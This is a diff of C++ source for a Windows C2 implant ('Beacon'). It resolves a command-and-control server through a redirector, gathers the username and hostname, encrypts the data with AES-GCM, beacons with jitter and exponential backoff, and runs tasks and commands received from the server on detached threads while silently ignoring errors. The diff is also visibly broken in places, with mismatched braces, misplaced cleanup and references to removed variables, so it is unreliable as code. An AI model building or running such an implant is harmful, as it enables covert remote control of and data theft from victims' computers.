@@ -5,6 +5,7 @@
 #include "../crypto/AesGcm.h"
 #include "../http/RedirectorResolver.h"
 #include "../http/WinHttpClient.h"
+#include "Task.h"
 #include "../external/nlohmann/json.hpp"
 
 #include <algorithm>
@@ -18,31 +19,24 @@
 #include <winhttp.h>
 
 namespace {
-
-std::string wideToUtf8(const wchar_t* buffer, DWORD len) {
-    if (!buffer || len == 0) {
-        return {};
+    beacon::TaskType stringToTaskType(const std::string& str) {
+        if (str == "sysinfo") return beacon::TaskType::SYSINFO;
+        // Add other mappings here
+        return beacon::TaskType::UNKNOWN;
     }
 
-    int required = WideCharToMultiByte(
-        CP_UTF8, 0, buffer, len, nullptr, 0, nullptr, nullptr);
-
-    if (required <= 0) {
-        return {};
-    }
-
-    std::string result(static_cast<size_t>(required), '\0');
-    WideCharToMultiByte(
-        CP_UTF8, 0, buffer, len, result.data(), required, nullptr, nullptr);
-
-    return result;
-}
-
-std::string getUsername() {
-    DWORD len = 0;
-    GetUserNameW(nullptr, &len);
-
-    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || len == 0) {
+    std::string getUsername() {
+        DWORD username_len = 0;
+        GetUserNameW(NULL, &username_len);
+        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+            std::vector<wchar_t> username(username_len);
+            if (GetUserNameW(username.data(), &username_len)) {
+                int len = WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, NULL, 0, NULL, NULL);
+                std::string result(len, 0);
+                WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, &result[0], len, NULL, NULL);
+                return result;
+            }
+        }
         return "Unknown";
     }
 
@@ -68,7 +62,8 @@ std::string getHostname() {
         return "Unknown";
     }
 
-    return wideToUtf8(buffer.data(), len);
+Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
+    implantId_ = core::generateImplantId();
 }
 
 // Simple RAII wrapper for CryptoAPI provider
@@ -133,10 +128,9 @@ void Beacon::run() {
         if (c2Url_.empty()) {
             try {
                 c2Url_ = resolver.resolve();
-                c2FetchBackoff_ = core::C2_FETCH_BACKOFF;
+                c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
             } catch (const std::exception&) {
-                std::this_thread::sleep_for(
-                    std::chrono::duration<double>(c2FetchBackoff_));
+                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                 if (c2FetchBackoff_ < 35 * 60) {
                     c2FetchBackoff_ *= 2;
                 }
@@ -222,26 +216,27 @@ void Beacon::run() {
                 c2Url_.clear();
                 continue;
             }
+            CryptReleaseContext(hProv, 0);
 
-            // -----------------------------
-            // Send request
-            // -----------------------------
-            http::WinHttpClient client(
-                std::wstring(core::USER_AGENTS[0].begin(),
-                             core::USER_AGENTS[0].end()));
+            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
+            std::vector<BYTE> encrypted_payload;
+            encrypted_payload.insert(encrypted_payload.end(), nonce.begin(), nonce.end());
+            encrypted_payload.insert(encrypted_payload.end(), ciphertext.begin(), ciphertext.end());
 
-            std::vector<BYTE> response =
-                client.post(
-                    std::wstring(comp.lpszHostName,
-                                 comp.dwHostNameLength),
-                    std::wstring(comp.lpszUrlPath,
-                                 comp.dwUrlPathLength),
-                    encrypted);
+            std::wstring wideC2Url(c2Url_.begin(), c2Url_.end());
+            URL_COMPONENTSW urlComp;
+            wchar_t serverName[256];
+            wchar_t path[256];
 
-            // -----------------------------
-            // Process response
-            // -----------------------------
-            if (response.size() < 12) {
+            memset(&urlComp, 0, sizeof(urlComp));
+            urlComp.dwStructSize = sizeof(urlComp);
+            urlComp.lpszHostName = serverName;
+            urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
+            urlComp.lpszUrlPath = path;
+            urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);
+
+            if (!WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
+                c2Url_ = "";
                 continue;
             }
 
@@ -253,41 +248,20 @@ void Beacon::run() {
                 response.begin() + 12,
                 response.end());
 
-            std::vector<BYTE> decrypted =
-                aes.decrypt(respCipher, respNonce);
+                if (response_json.contains("tasks")) {
+                    for (const auto& task_json : response_json["tasks"]) {
+                        Task task;
+                        task.task_id = task_json["task_id"];
+                        task.type = stringToTaskType(task_json["type"]);
+                        task.cmd = task_json.value("cmd", "");
 
-            std::string respStr(
-                decrypted.begin(), decrypted.end());
-
-            nlohmann::json resp =
-                nlohmann::json::parse(respStr, nullptr, false);
-
-            if (!resp.is_object()) {
-                continue;
+                        std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
+                    }
+                }
             }
-
-            if (resp.contains("ack_ids")) {
-                auto ackIds =
-                    resp["ack_ids"]
-                        .get<std::vector<std::string>>();
-
-                inFlightResults_.erase(
-                    std::remove_if(
-                        inFlightResults_.begin(),
-                        inFlightResults_.end(),
-                        [&ackIds](const Result& r) {
-                            return std::find(
-                                ackIds.begin(),
-                                ackIds.end(),
-                                r.task_id) != ackIds.end();
-                        }),
-                    inFlightResults_.end());
-            }
-
-            // TODO: task execution
 
         } catch (const std::exception&) {
-            // intentionally ignored
+            // Silently continue
         }
 
         sleepWithJitter();
